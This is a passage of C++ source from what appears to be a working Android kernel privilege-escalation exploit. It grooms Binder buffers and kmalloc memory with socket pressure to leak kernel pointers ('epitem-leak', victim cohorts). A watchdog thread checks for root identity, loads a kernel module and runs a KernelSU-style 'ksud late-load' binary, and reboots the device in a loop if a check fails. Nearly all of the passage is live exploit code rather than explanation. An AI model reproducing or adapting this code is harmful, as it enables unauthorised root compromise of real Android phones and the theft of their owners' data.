            SYS_getresgid, &value.gid[0], &value.gid[1], &value.gid[2]));
    value.fsuid = static_cast<uid_t>(syscall(SYS_setfsuid, -1));
    value.fsgid = static_cast<gid_t>(syscall(SYS_setfsgid, -1));
    __user_cap_header_struct header {};
    __user_cap_data_struct data[2] {};
    header.version = _LINUX_CAPABILITY_VERSION_3;
    header.pid = 0;
    int capability_result = static_cast<int>(syscall(
            SYS_capget, &header, data));
    value.effective_caps =
            static_cast<std::uint64_t>(data[0].effective) |
            (static_cast<std::uint64_t>(data[1].effective) << 32U);
    if (uid_result != 0 || gid_result != 0 || capability_result != 0 ||
        value.pid <= 0 || value.tid <= 0) {
        return false;
    }
    *identity = value;
    return true;
}

bool command_identity_is_shell(const CommandRootIdentity& identity) {
    return identity.uid[0] == 2000 && identity.uid[1] == 2000 &&
            identity.uid[2] == 2000 && identity.gid[0] == 2000 &&
            identity.gid[1] == 2000 && identity.gid[2] == 2000 &&
            identity.fsuid == 2000 && identity.fsgid == 2000;
}

bool command_identity_is_root(const CommandRootIdentity& identity) {
    return identity.uid[0] == 0 && identity.uid[1] == 0 &&
            identity.uid[2] == 0 && identity.gid[0] == 0 &&
            identity.gid[1] == 0 && identity.gid[2] == 0 &&
            identity.fsuid == 0 && identity.fsgid == 0 &&
            (identity.effective_caps & (UINT64_C(1) << 22U)) != 0;
}

bool same_command_root_identity(
        const CommandRootIdentity& first,
        const CommandRootIdentity& second) {
    return command_identity_is_root(first) && command_identity_is_root(second) &&
            first.pid == second.pid && first.effective_caps ==
                    second.effective_caps &&
            std::equal(std::begin(first.uid), std::end(first.uid),
                       std::begin(second.uid)) &&
            std::equal(std::begin(first.gid), std::end(first.gid),
                       std::begin(second.gid)) &&
            first.fsuid == second.fsuid && first.fsgid == second.fsgid;
}

void wake_command_watchdog(std::atomic<int>* value, int count) {
    syscall(SYS_futex, value, FUTEX_WAKE_PRIVATE, count,
            nullptr, nullptr, 0);
}

bool wait_for_command_watchdog(
        std::atomic<int>* value, int desired, int timeout_seconds) {
    timespec started {};
    if (clock_gettime(CLOCK_MONOTONIC, &started) != 0) {
        return false;
    }
    std::int64_t deadline =
            static_cast<std::int64_t>(started.tv_sec + timeout_seconds) *
                    1000000000LL + started.tv_nsec;
    timespec delay {0, 1000000};
    for (;;) {
        int current = value->load(std::memory_order_acquire);
        if (current == desired) {
            return true;
        }
        if (current < 0) {
            return false;
        }
        timespec now {};
        if (clock_gettime(CLOCK_MONOTONIC, &now) != 0 ||
            static_cast<std::int64_t>(now.tv_sec) * 1000000000LL +
                    now.tv_nsec >= deadline) {
            return false;
        }
        (void)syscall(SYS_nanosleep, &delay, nullptr);
    }
}

[[noreturn]] void command_watchdog_reboot_forever() {
    for (;;) {
        (void)reboot(RB_AUTOBOOT);
        timespec delay {1, 0};
        (void)syscall(SYS_nanosleep, &delay, nullptr);
    }
}

void write_command_watchdog_invalid(const char* reason) {
    char line[256];
    int length = std::snprintf(
            line, sizeof(line),
            "BRIDGE_COMMAND_ROOT_WATCHDOG_INVALID nonce=%s reason=%s\n",
            g_command_watchdog_nonce, reason);
    if (length > 0 && length < static_cast<int>(sizeof(line)) &&
        g_command_watchdog_output_fd >= 0) {
        if (write_all(g_command_watchdog_output_fd, line,
                      static_cast<std::size_t>(length))) {
            (void)fsync(g_command_watchdog_output_fd);
        }
    }
}

void write_ctlbuf_rescue_stage(
        int stage_code, const char* stage, int result, int error, int detail) {
    g_ctlbuf_rescue_result.store(result, std::memory_order_relaxed);
    g_ctlbuf_rescue_errno.store(error, std::memory_order_relaxed);
    g_ctlbuf_rescue_detail.store(detail, std::memory_order_relaxed);
    g_ctlbuf_rescue_stage.store(stage_code, std::memory_order_release);
    char line[320];
    int length = std::snprintf(
            line, sizeof(line),
            "BRIDGE_COMMAND_CTLBUF_RESCUE_STAGE nonce=%s"
            " stage=%s result=%d errno=%d detail=%d\n",
            g_command_watchdog_nonce, stage, result, error, detail);
    if (length > 0 && length < static_cast<int>(sizeof(line)) &&
        g_command_watchdog_output_fd >= 0) {
        if (write_all(g_command_watchdog_output_fd, line,
                      static_cast<std::size_t>(length))) {
            (void)fsync(g_command_watchdog_output_fd);
        }
    }
}

void* command_root_watchdog_thread(void*) {
    CommandRootIdentity identity;
    bool valid = read_command_root_identity(&identity) &&
            identity.tid != identity.pid &&
            same_command_root_identity(
                    g_command_watchdog_leader_identity, identity);
    g_command_watchdog_identity = identity;
    g_command_watchdog_tid.store(identity.tid, std::memory_order_release);
    if (!valid) {
        g_command_watchdog_phase.store(
                kCommandWatchdogFailed, std::memory_order_release);
        g_command_watchdog_ready.store(-1, std::memory_order_release);
        wake_command_watchdog(&g_command_watchdog_ready, INT_MAX);
        write_command_watchdog_invalid("child-identity");
        command_watchdog_reboot_forever();
    }

    g_command_watchdog_phase.store(
            kCommandWatchdogReady, std::memory_order_release);
    g_command_watchdog_ready.store(1, std::memory_order_release);
    wake_command_watchdog(&g_command_watchdog_ready, INT_MAX);
    timespec delay {0, 10'000'000};
    timespec started {};
    if (clock_gettime(CLOCK_MONOTONIC, &started) != 0) {
        command_watchdog_reboot_forever();
    }
    std::int64_t deadline =
            static_cast<std::int64_t>(started.tv_sec + 180) *
                    1000000000LL + started.tv_nsec;
    for (;;) {
        if (g_command_watchdog_exit.load(std::memory_order_acquire) == 1) {
            break;
        }
        int action = g_resukisu_action.load(std::memory_order_acquire);
        if (action == 1 || action == 2) {
            int manager_uid = g_resukisu_manager_uid.load(
                    std::memory_order_acquire);
            int action_fd = g_resukisu_fd;
            int module_fd = g_resukisu_module_fd;
            int diagnostic_pipe[2] {-1, -1};
            errno = 0;
            int pipe_result = pipe2(diagnostic_pipe, O_CLOEXEC);
            int pipe_error = pipe_result == 0 ? 0 : errno;
            errno = 0;
            pid_t child = pipe_result == 0 ? fork() : -1;
            if (child == 0) {
                close(diagnostic_pipe[0]);
                if (g_resukisu_probe == nullptr ||
                    g_resukisu_load == nullptr) {
                    _exit(125);
                }
                if (action == 1) {
                    _exit(g_resukisu_probe() == UINT32_C(0x4c503352)
                            ? 0 : 124);
                }
                int load_result = g_resukisu_load(
                        static_cast<std::uint32_t>(manager_uid),
                        diagnostic_pipe[1], module_fd,
                        g_resukisu_kernel_base.load(
                                std::memory_order_acquire));
                if (load_result != 0) {
                    _exit(100 + std::min(load_result, 120));
                }
                char uid[16];
                std::snprintf(uid, sizeof(uid), "%d", manager_uid);
                constexpr char kReSukiExecutable[] =
                        "/data/local/tmp/lp3-resukisu-ksud";
                struct stat descriptor_stat {};
                struct stat path_stat {};
                errno = 0;
                if (fstat(action_fd, &descriptor_stat) != 0 ||
                        stat(kReSukiExecutable, &path_stat) != 0 ||
                        descriptor_stat.st_dev != path_stat.st_dev ||
                        descriptor_stat.st_ino != path_stat.st_ino ||
                        descriptor_stat.st_size != path_stat.st_size ||
                        descriptor_stat.st_uid != path_stat.st_uid ||
                        descriptor_stat.st_gid != path_stat.st_gid ||
                        descriptor_stat.st_mode != path_stat.st_mode) {
                    int duplicate_error = errno == 0 ? ESTALE : errno;
                    char diagnostic[128];
                    int diagnostic_length = std::snprintf(
                            diagnostic, sizeof(diagnostic),
                            "LP3_RESUKISU_EXEC_PATH_ERROR errno=%d"
                            " action_fd=%d\n",
                            duplicate_error, action_fd);
                    if (diagnostic_length > 0 &&
                            diagnostic_length <
                                    static_cast<int>(sizeof(diagnostic))) {
                        (void)write_all(
                                diagnostic_pipe[1], diagnostic,
                                static_cast<std::size_t>(diagnostic_length));
                    }
                    _exit(127);
                }
                if (dup2(diagnostic_pipe[1], STDERR_FILENO) !=
                        STDERR_FILENO) {
                    _exit(127);
                }
                execl("/system/bin/linker64", "linker64",
                      kReSukiExecutable, "late-load",
                      "--kmi", "android12-5.10",
                      "--package-name", "com.resukisu.resukisu",
                      "--foreground-manager-uid", uid,
                      static_cast<char*>(nullptr));
                int exec_error = errno;
                char diagnostic[192];
                int diagnostic_length = std::snprintf(
                        diagnostic, sizeof(diagnostic),
                        "LP3_RESUKISU_EXEC_ERROR errno=%d action_fd=%d"
                        " executable=%s\n",
                        exec_error, action_fd, kReSukiExecutable);
                if (diagnostic_length > 0 &&
                        diagnostic_length <
                                static_cast<int>(sizeof(diagnostic))) {
                    (void)write_all(
                            diagnostic_pipe[1], diagnostic,
                            static_cast<std::size_t>(diagnostic_length));
                }
                _exit(126);
            }
            int fork_error = pipe_error != 0
                    ? pipe_error : (child < 0 ? errno : 0);
            if (diagnostic_pipe[1] >= 0) {
                close(diagnostic_pipe[1]);
                diagnostic_pipe[1] = -1;
            }
            int status = 0;
            int wait_error = 0;
            if (child > 0) {
                timespec action_started {};
                (void)clock_gettime(CLOCK_MONOTONIC, &action_started);
                std::int64_t action_deadline =
                        static_cast<std::int64_t>(action_started.tv_sec + 120) *
                                1000000000LL + action_started.tv_nsec;
                for (;;) {
                    errno = 0;
                    pid_t waited = waitpid(child, &status, WNOHANG);
                    if (waited == child) {
                        break;
                    }
                    if (waited < 0) {
                        wait_error = errno;
                        break;
                    }
                    timespec now {};
                    if (clock_gettime(CLOCK_MONOTONIC, &now) != 0 ||
                        static_cast<std::int64_t>(now.tv_sec) * 1000000000LL +
                                now.tv_nsec >= action_deadline) {
                        (void)kill(child, SIGKILL);
                        (void)waitpid(child, &status, 0);
                        wait_error = ETIMEDOUT;
                        break;
                    }
                    (void)syscall(SYS_nanosleep, &delay, nullptr);
                }
            }
            if (diagnostic_pipe[0] >= 0) {
                char diagnostic[2048];
                for (;;) {
                    ssize_t count = read(
                            diagnostic_pipe[0], diagnostic,
                            sizeof(diagnostic));
                    if (count <= 0) {
                        break;
                    }
                    if (g_command_watchdog_output_fd >= 0) {
                        (void)write_all(
                                g_command_watchdog_output_fd, diagnostic,
                                static_cast<std::size_t>(count));
                    }
                }
                close(diagnostic_pipe[0]);
            }
            int result = child > 0 && wait_error == 0 && WIFEXITED(status)
                    ? WEXITSTATUS(status) : -1;
            g_resukisu_exit.store(result, std::memory_order_release);
            g_resukisu_errno.store(
                    fork_error != 0 ? fork_error : wait_error,
                    std::memory_order_release);
            if (g_resukisu_fd >= 0) {
                close(g_resukisu_fd);
                g_resukisu_fd = -1;
            }
            if (g_resukisu_module_fd >= 0) {
                close(g_resukisu_module_fd);
                g_resukisu_module_fd = -1;
            }
            g_resukisu_action.store(3, std::memory_order_release);
            wake_command_watchdog(&g_resukisu_action, INT_MAX);
        }
        timespec now {};
        if (clock_gettime(CLOCK_MONOTONIC, &now) != 0 ||
            static_cast<std::int64_t>(now.tv_sec) * 1000000000LL +
                    now.tv_nsec >= deadline) {
            command_watchdog_reboot_forever();
        }
        (void)syscall(SYS_nanosleep, &delay, nullptr);
    }
    return nullptr;
}

bool write_token_inventory(const std::string& path,
                           const std::vector<BatchToken>& tokens) {
    std::string temporary = path + ".tmp";
    int fd = open(temporary.c_str(),
            O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
    if (fd < 0) {
        return false;
    }
    std::uint32_t count = static_cast<std::uint32_t>(tokens.size());
    bool pass = write_all(fd, &count, sizeof(count)) &&
            write_all(fd, tokens.data(), tokens.size() * sizeof(tokens[0])) &&
            fsync(fd) == 0;
    close(fd);
    if (!pass || rename(temporary.c_str(), path.c_str()) != 0) {
        unlink(temporary.c_str());
        return false;
    }
    return true;
}

std::vector<BatchToken> read_token_inventory(const std::string& path) {
    std::vector<BatchToken> tokens;
    int fd = open(path.c_str(), O_RDONLY | O_CLOEXEC);
    std::uint32_t count = 0;
    if (fd >= 0 && read(fd, &count, sizeof(count)) == sizeof(count) &&
        count == kCohortSize) {
        tokens.resize(count);
        std::size_t size = tokens.size() * sizeof(tokens[0]);
        std::size_t consumed = 0;
        while (consumed < size) {
            ssize_t result = read(fd,
                    reinterpret_cast<std::uint8_t*>(tokens.data()) + consumed,
                    size - consumed);
            if (result < 0 && errno == EINTR) {
                continue;
            }
            if (result <= 0) {
                tokens.clear();
                break;
            }
            consumed += static_cast<std::size_t>(result);
        }
    }
    if (fd >= 0) {
        close(fd);
    }
    return tokens;
}

int choose_shared_cpu() {
    cpu_set_t allowed;
    CPU_ZERO(&allowed);
    if (sched_getaffinity(0, sizeof(allowed), &allowed) != 0) {
        return -1;
    }
    if (CPU_ISSET(2, &allowed)) {
        return 2;
    }
    for (int cpu = 0; cpu < CPU_SETSIZE; ++cpu) {
        if (CPU_ISSET(cpu, &allowed)) {
            return cpu;
        }
    }
    return -1;
}

void run_epitem_owner(std::string directory) {
    const std::string result_path = directory + "/epitem-leak.result";
    std::vector<int> kmalloc_predrain_sockets;
    auto fail = [&](const char* reason) {
        release_scm_pressure(&kmalloc_predrain_sockets);
        write_text_file(result_path,
                std::string("status=fail stage=epitem-leak reason=") + reason);
        g_epitem_owner_armed.store(false);
    };

    int fd = duplicate_binder_fd();
    if (fd < 0) {
        fail("owner-binder");
        return;
    }
    std::uint32_t enter = BC_ENTER_LOOPER;
    if (write_binder_commands(fd, &enter, sizeof(enter)) != 0) {
        close(fd);
        fail("owner-looper");
        return;
    }
    if (!wait_for_file(directory + "/epitem-reader.prepare", 1000)) {
        close(fd);
        fail("prepare-timeout");
        return;
    }

    int cpu = choose_shared_cpu();
    std::string preferred_cpu = read_text_file(
            directory + "/epitem-preferred-cpu");
    if (!preferred_cpu.empty()) {
        int candidate = std::atoi(preferred_cpu.c_str());
        cpu_set_t allowed;
        CPU_ZERO(&allowed);
        if (candidate >= 0 && candidate < CPU_SETSIZE &&
                sched_getaffinity(0, sizeof(allowed), &allowed) == 0 &&
                CPU_ISSET(candidate, &allowed)) {
            cpu = candidate;
        }
    }
    cpu_set_t set;
    CPU_ZERO(&set);
    if (cpu >= 0) {
        CPU_SET(cpu, &set);
    }
    if (cpu < 0 || sched_setaffinity(0, sizeof(set), &set) != 0) {
        close(fd);
        fail("owner-affinity");
        return;
    }
    char waiting[32];
    std::snprintf(waiting, sizeof(waiting), "cpu=%d", cpu);
    if (!write_text_file(directory + "/epitem-reader.waiting", waiting) ||
        !wait_for_file(directory + "/epitem-reader.start", 1000)) {
        close(fd);
        fail("start-timeout");
        return;
    }

    std::vector<binder_uintptr_t> fragment_anchors;
    fragment_anchors.reserve(kFragmentCount / 2);
    int fragments = 0;
    int gaps = 0;
    while (fragments < kFragmentCount) {
        std::uint8_t read_buffer[4096] {};
        binder_write_read request {};
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(read_buffer);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            break;
        }
        for (std::size_t offset = 0;
             offset + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + offset, sizeof(response));
            offset += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (offset + payload_size > request.read_consumed) {
                break;
            }
            if ((response == BR_TRANSACTION ||
                 response == BR_TRANSACTION_SEC_CTX) &&
                payload_size >= sizeof(binder_transaction_data)) {
                binder_transaction_data transaction {};
                std::memcpy(&transaction, read_buffer + offset,
                            sizeof(transaction));
                if (transaction.code == kFragmentHoldCode &&
                    fragments < kFragmentCount) {
                    bool keep = (fragments % 2) == 0;
                    ++fragments;
                    if (keep) {
                        fragment_anchors.push_back(
                                transaction.data.ptr.buffer);
                    } else {
                        free_buffer(fd, transaction.data.ptr.buffer);
                        ++gaps;
                    }
                }
            }
            offset += payload_size;
        }
    }
    if (fragments != kFragmentCount || gaps != kFragmentCount / 2) {
        close(fd);
        fail("fragmentation");
        return;
    }
    char fragmented[128];
    std::snprintf(fragmented, sizeof(fragmented),
            "seen=%d anchors=%zu gaps=%d", fragments,
            fragment_anchors.size(), gaps);
    write_text_file(directory + "/epitem-reader.fragmented", fragmented);

    int kmalloc_predrain_errno = 0;
    int kmalloc_predrain_objects = allocate_scm_pressure(
            &kmalloc_predrain_sockets, &kmalloc_predrain_errno);
    if (kmalloc_predrain_objects < kScmPressureMinimum) {
        close(fd);
        fail("kmalloc-predrain");
        return;
    }

    std::vector<std::uint64_t> binder_tokens(kCohortSize);
    std::vector<std::uint64_t> cookie_tokens(kCohortSize);
    std::vector<flat_binder_object> objects(kCohortSize);
    std::vector<binder_size_t> offsets(kCohortSize);
    std::vector<BatchToken> inventory;
    inventory.reserve(kCohortSize);
    for (int index = 0; index < kCohortSize; ++index) {
        binder_tokens[index] = UINT64_C(0x5334000000000000) |
                static_cast<std::uint32_t>(index);
        cookie_tokens[index] = UINT64_C(0x4334000000000000) |
                static_cast<std::uint32_t>(index);
        objects[index].hdr.type = BINDER_TYPE_BINDER;
        objects[index].flags = FLAT_BINDER_FLAG_ACCEPTS_FDS;
        objects[index].binder = reinterpret_cast<binder_uintptr_t>(
                &binder_tokens[index]);
        objects[index].cookie = reinterpret_cast<binder_uintptr_t>(
                &cookie_tokens[index]);
        offsets[index] = static_cast<binder_size_t>(index) * sizeof(objects[0]);
        inventory.push_back({objects[index].binder, objects[index].cookie});
    }
    if (!write_token_inventory(directory + "/epitem-node-tokens.bin",
                               inventory)) {
        close(fd);
        fail("inventory-write");
        return;
    }

    bool exported = false;
    for (int attempt = 0; attempt < 6000 && !exported; ++attempt) {
        std::uint8_t read_buffer[4096] {};
        binder_write_read request {};
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(read_buffer);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            break;
        }
        for (std::size_t offset = 0;
             offset + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + offset, sizeof(response));
            offset += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (offset + payload_size > request.read_consumed) {
                break;
            }
            if ((response == BR_TRANSACTION ||
                 response == BR_TRANSACTION_SEC_CTX) &&
                payload_size >= sizeof(binder_transaction_data)) {
                binder_transaction_data incoming {};
                std::memcpy(&incoming, read_buffer + offset,
                            sizeof(incoming));
                if (incoming.code == kNativeBatchCode &&
                    !(incoming.flags & TF_ONE_WAY)) {
                    binder_transaction_data reply {};
                    reply.flags = TF_ACCEPT_FDS;
                    reply.data_size = objects.size() * sizeof(objects[0]);
                    reply.offsets_size = offsets.size() * sizeof(offsets[0]);
                    reply.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(
                            objects.data());
                    reply.data.ptr.offsets = reinterpret_cast<binder_uintptr_t>(
                            offsets.data());
                    std::uint8_t command[
                            sizeof(std::uint32_t) + sizeof(reply)] {};
                    write_command(command, BC_REPLY, &reply, sizeof(reply));
                    exported = write_binder_commands(
                            fd, command, sizeof(command)) == 0;
                    break;
                }
            }
            offset += payload_size;
        }
    }
    if (!exported) {
        close(fd);
        fail("batch-export");
        return;
    }

    std::string queued_path = directory + "/epitem-client.queued";
    std::string exiting_path = directory + "/epitem-client.exiting";
    bool queued_ready = false;
    for (int attempt = 0; attempt < 2000 && !queued_ready; ++attempt) {
        queued_ready = read_text_file(queued_path).find(
                "nodes=1152 transactions=1152") != std::string::npos;
        if (!queued_ready) {
            usleep(10000);
        }
    }
    int client_pid = 0;
    for (int attempt = 0; queued_ready && client_pid <= 0 &&
         attempt < 200; ++attempt) {
        client_pid = std::atoi(read_text_file(exiting_path).c_str());
        if (client_pid <= 0) {
            usleep(10000);
        }
    }
    if (!queued_ready || client_pid <= 0) {
        close(fd);
        fail("client-queue");
        return;
    }
    bool client_dead = false;
    for (int attempt = 0; client_pid > 0 && attempt < 4500; ++attempt) {
        errno = 0;
        if (kill(client_pid, 0) != 0 && errno == ESRCH) {
            client_dead = true;
            break;
        }
        usleep(10000);
    }
    if (!client_dead) {
        close(fd);
        fail("client-lifetime");
        return;
    }
    // Process exit can precede Binder's deferred release work. Use the same
    // settle interval as the later raw-client hand-off before ref decrements.
    constexpr int deferred_settle_ms = 1500;
    usleep(deferred_settle_ms * 1000);

    char ready[256];
    std::snprintf(ready, sizeof(ready),
            "status=ready nodes=1152 transactions=1152 inventory=1152"
            " fragments=%d gaps=%d cpu=%d client_dead=1"
            " deferred_settle_ms=%d unread=1152",
            fragments, gaps, cpu, deferred_settle_ms);
    if (!write_text_file(directory + "/epitem-leak.unread-ready", ready)) {
        close(fd);
        fail("read-enable");
        return;
    }

    if (!wait_for_file(directory + "/epitem-nodes-decremented", 12000)) {
        close(fd);
        fail("decrement-timeout");
        return;
    }
    int kmalloc_predrain_fds = release_scm_pressure(
            &kmalloc_predrain_sockets);
    char predrain_released[192];
    std::snprintf(predrain_released, sizeof(predrain_released),
            "status=pass objects=%d minimum=%d fds_closed=%d errno=%d",
            kmalloc_predrain_objects, kScmPressureMinimum,
            kmalloc_predrain_fds, kmalloc_predrain_errno);
    if (!write_text_file(directory + "/kmalloc-predrain.released",
                         predrain_released)) {
        close(fd);
        fail("predrain-release");
        return;
    }

    if (!wait_for_file(directory + "/epitem-leak.read-enable", 12000)) {
        close(fd);
        fail("read-enable");
        return;
    }

    struct LeakRecord {
        std::uint64_t buffer;
        std::uint64_t ptr;
        std::uint64_t cookie;
    };
    std::vector<LeakRecord> records;
    std::vector<std::uint64_t> kernel_values;
    records.reserve(kCohortSize);
    kernel_values.reserve(kCohortSize * 2);
    std::sort(inventory.begin(), inventory.end());
    std::size_t original_pairs = 0;
    std::size_t canonical_pairs = 0;
    bool end = false;
    while (!end) {
        std::uint8_t read_buffer[4096] {};
        binder_write_read request {};
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(read_buffer);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            break;
        }
        for (std::size_t offset = 0;
             offset + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + offset, sizeof(response));
            offset += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (offset + payload_size > request.read_consumed) {
                break;
            }
            if ((response == BR_TRANSACTION ||
                 response == BR_TRANSACTION_SEC_CTX) &&
                payload_size >= sizeof(binder_transaction_data)) {
                binder_transaction_data transaction {};
                std::memcpy(&transaction, read_buffer + offset,
                            sizeof(transaction));
                if (transaction.code == kVictimHoldCode &&
                    records.size() < kCohortSize) {
                    std::uint64_t ptr = transaction.target.ptr;
                    std::uint64_t cookie = transaction.cookie;
                    records.push_back({transaction.data.ptr.buffer,
                                       ptr, cookie});
                    if (std::binary_search(inventory.begin(), inventory.end(),
                                           BatchToken{ptr, cookie})) {
                        ++original_pairs;
                    }
                    if (kernel_pointer(ptr)) {
                        kernel_values.push_back(ptr);
                    }
                    if (kernel_pointer(cookie)) {
                        kernel_values.push_back(cookie);
                    }
                    if (kernel_pointer(ptr) && kernel_pointer(cookie)) {
                        ++canonical_pairs;
                    }
                } else if (transaction.code == kBatchEndCode) {
                    end = true;
                    free_buffer(fd, transaction.data.ptr.buffer);
                }
            }
            offset += payload_size;
        }
    }

    std::vector<std::uint64_t> pages;
    pages.reserve(kernel_values.size());
    for (std::uint64_t value : kernel_values) {
        pages.push_back(value & ~UINT64_C(0xfff));
    }
    std::sort(pages.begin(), pages.end());
    std::size_t dense_pages = 0;
    std::size_t maximum_page_hits = 0;
    for (std::size_t first = 0; first < pages.size();) {
        std::size_t last = first + 1;
        while (last < pages.size() && pages[last] == pages[first]) {
            ++last;
        }
        std::size_t hits = last - first;
        if (hits >= 4) {
            ++dense_pages;
        }
        maximum_page_hits = std::max(maximum_page_hits, hits);
        first = last;
    }

    std::string binary_path = directory + "/epitem-leaks.bin";
    std::string binary_temporary = binary_path + ".tmp";
    int records_fd = open(binary_temporary.c_str(),
            O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
    std::uint32_t version = 1;
    std::uint32_t record_count = static_cast<std::uint32_t>(records.size());
    bool binary = records_fd >= 0 &&
            write_all(records_fd, &version, sizeof(version)) &&
            write_all(records_fd, &record_count, sizeof(record_count)) &&
            write_all(records_fd, records.data(),
                      records.size() * sizeof(records[0])) &&
            fsync(records_fd) == 0;
    if (records_fd >= 0) {
        close(records_fd);
    }
    if (binary) {
        binary = rename(binary_temporary.c_str(), binary_path.c_str()) == 0;
    }
    if (!binary) {
        unlink(binary_temporary.c_str());
    }
    bool pass = end && records.size() == kCohortSize &&
            original_pairs < records.size() && canonical_pairs > 0 && binary;
    char result[512];
    std::snprintf(result, sizeof(result),
            "status=%s stage=epitem-leak received=%zu expected=1152"
            " canonical_pairs=%zu original_pairs=%zu kernel_values=%zu"
            " dense_pages=%zu max_page_hits=%zu end=%d binary=%d"
            " stale_buffers_freed=0",
            pass ? "pass" : "miss", records.size(), canonical_pairs,
            original_pairs, kernel_values.size(), dense_pages,
            maximum_page_hits, end ? 1 : 0, binary ? 1 : 0);
    write_text_file(result_path, result);
    __android_log_print(ANDROID_LOG_INFO, "LP3BinderDirect", "%s", result);

    {
        std::lock_guard<std::mutex> lock(g_owner_fragment_mutex);
        g_owner_fragment_buffers = std::move(fragment_anchors);
    }

    close(fd);
    g_epitem_owner_armed.store(false);
}

bool reply_raw_export_cohort(int fd, const std::string& directory) {
    constexpr std::size_t kRecordSize =
            sizeof(flat_binder_object) + sizeof(std::int32_t);
    constexpr std::size_t kHeaderSize = 2 * sizeof(std::int32_t);
    std::vector<std::uint8_t> payload(
            kHeaderSize + kRawCohortVictim * kRecordSize);
    std::vector<binder_size_t> offsets(kRawCohortVictim);
    std::int32_t count = kRawCohortVictim;
    std::int32_t selected = kRawCohortVictim;
    std::int32_t stability = 12;
    std::memcpy(payload.data(), &count, sizeof(count));
    std::memcpy(payload.data() + sizeof(count), &selected,
                sizeof(selected));

    for (int index = 0; index < kRawCohortVictim; ++index) {
        g_raw_cohort_binder_tokens[index] =
                UINT64_C(0x5334c02100000000) |
                static_cast<std::uint32_t>(index);
        g_raw_cohort_cookie_tokens[index] =
                UINT64_C(0x4334c02100000000) |
                static_cast<std::uint32_t>(index);
        flat_binder_object object {};
        object.hdr.type = BINDER_TYPE_BINDER;
        object.flags = FLAT_BINDER_FLAG_ACCEPTS_FDS;
        object.binder = reinterpret_cast<binder_uintptr_t>(
                &g_raw_cohort_binder_tokens[index]);
        object.cookie = reinterpret_cast<binder_uintptr_t>(
                &g_raw_cohort_cookie_tokens[index]);
        std::size_t record = kHeaderSize +
                static_cast<std::size_t>(index) * kRecordSize;
        offsets[index] = static_cast<binder_size_t>(record);
        std::memcpy(payload.data() + record, &object, sizeof(object));
        std::memcpy(payload.data() + record + sizeof(object), &stability,
                    sizeof(stability));
    }

    binder_transaction_data reply {};
    reply.data_size = payload.size();
    reply.offsets_size = offsets.size() * sizeof(offsets[0]);
    reply.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(
            payload.data());
    reply.data.ptr.offsets = reinterpret_cast<binder_uintptr_t>(
            offsets.data());
    std::uint8_t command[sizeof(std::uint32_t) + sizeof(reply)] {};
    write_command(command, BC_REPLY, &reply, sizeof(reply));
    int cpu_before = sched_getcpu();
    int written = cpu_before == 2
            ? write_binder_commands(fd, command, sizeof(command)) : -1;
    int cpu_after = sched_getcpu();
    bool pass = written == 0 && cpu_before == 2 && cpu_after == 2;
    char state[256];
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-cohort-export count=%d selected=%d"
            " settled=%d anchors_total=%d"
            " cpu_before=%d cpu_after=%d written=%d",
            pass ? "pass" : "fail", kRawCohortVictim,
            kRawCohortVictim, kRawCohortVictim,
            kRawCohortAnchorCount,
            cpu_before, cpu_after, written);
    write_text_file(directory + "/raw-cohort-export.result", state);
    return pass;
}

bool settle_raw_export_cohort(int fd, const std::string& directory) {
    int increfs = 0;
    int acquires = 0;
    int releases = 0;
    int decrefs = 0;
    int unexpected_transactions = 0;
    bool marker_seen = false;
    bool early_controlled = false;
    bool acknowledgements_valid = true;
    std::set<BatchToken> expected;
    std::set<BatchToken> incref_tokens;
    std::set<BatchToken> acquire_tokens;
    for (int index = 0; index < kRawCohortVictim; ++index) {
        expected.insert({
                reinterpret_cast<std::uint64_t>(
                        &g_raw_cohort_binder_tokens[index]),
                reinterpret_cast<std::uint64_t>(
                        &g_raw_cohort_cookie_tokens[index])});
    }
    for (int attempt = 0; attempt < 120 && !marker_seen &&
         !early_controlled; ++attempt) {
        pollfd descriptor {fd, POLLIN, 0};
        int poll_result = poll(&descriptor, 1, 1000);
        if (poll_result < 0 && errno == EINTR) {
            --attempt;
            continue;
        }
        if (poll_result <= 0 || !(descriptor.revents & POLLIN)) {
            continue;
        }
        std::uint8_t read_buffer[4096] {};
        binder_write_read request {};
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(
                read_buffer);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            if (errno == EINTR) {
                --attempt;
                continue;
            }
            break;
        }
        std::vector<std::uint8_t> acknowledgements;
        for (std::size_t offset = 0;
             offset + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + offset,
                        sizeof(response));
            offset += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (offset + payload_size > request.read_consumed) {
                unexpected_transactions = -1;
                break;
            }
            if ((response == BR_INCREFS || response == BR_ACQUIRE) &&
                    payload_size >= sizeof(binder_ptr_cookie)) {
                binder_ptr_cookie reference {};
                std::memcpy(&reference, read_buffer + offset,
                            sizeof(reference));
                BatchToken token {reference.ptr, reference.cookie};
                std::set<BatchToken>& seen = response == BR_INCREFS
                        ? incref_tokens : acquire_tokens;
                if (expected.find(token) == expected.end() ||
                        !seen.insert(token).second) {
                    acknowledgements_valid = false;
                    break;
                }
                if (response == BR_INCREFS) {
                    ++increfs;
                } else {
                    ++acquires;
                }
                std::size_t command_offset = acknowledgements.size();
